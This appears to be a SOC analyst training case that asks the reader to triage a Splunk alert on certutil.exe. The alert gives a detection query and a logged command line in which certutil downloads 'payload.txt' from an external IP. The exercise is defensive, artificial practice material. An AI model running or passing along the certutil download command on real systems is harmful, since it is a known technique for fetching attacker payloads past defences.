# Case 008 — certutil.exe Living-off-the-Land Download

**Incident ID:** IR-2026-024
**Date Detected:** 2026-07-03
**Host:** JIMIL-JOSHI
**Reported By:** SOC Monitoring (Splunk Alert)
**Status:** 🔴 Open — Pending Triage

---

## 🎫 Alert Summary

| Field | Value |
|---|---|
| EventCode | 4688 (Process Creation) |
| Process | certutil.exe |
| Account | hp |
| Computer | JIMIL-JOSHI |
| Trigger | `certutil.exe -urlcache` detected fetching external content |

---

## 📄 Raw Event Data

**SPL Query Used:**
```spl
index=* sourcetype="WinEventLog:Security" EventCode=4688 New_Process_Name="*certutil.exe"
| table _time, ComputerName, Account_Name, New_Process_Name, Process_Command_Line, Creator_Process_Name
| sort -_time
| head 10
```

**Result:**

| _time | ComputerName | Account_Name | New_Process_Name | Process_Command_Line | Creator_Process_Name |
|---|---|---|---|---|---|
| 2026-07-03 20:00:26.793 | JIMIL-JOSHI | hp | C:\Windows\System32\certutil.exe | certutil.exe -urlcache -split -f http://185.220.101.45/payload.txt payload.txt | cmd.exe |

---

## 🎯 Task

Triage this alert. Determine:
1. Is this TP / FP / Ambiguous?
2. Is `185.220.101.45` a public or private IP address?
3. What legitimate purpose does `certutil.exe` normally serve, and how does that differ from this usage?
4. What is your final verdict and justification?
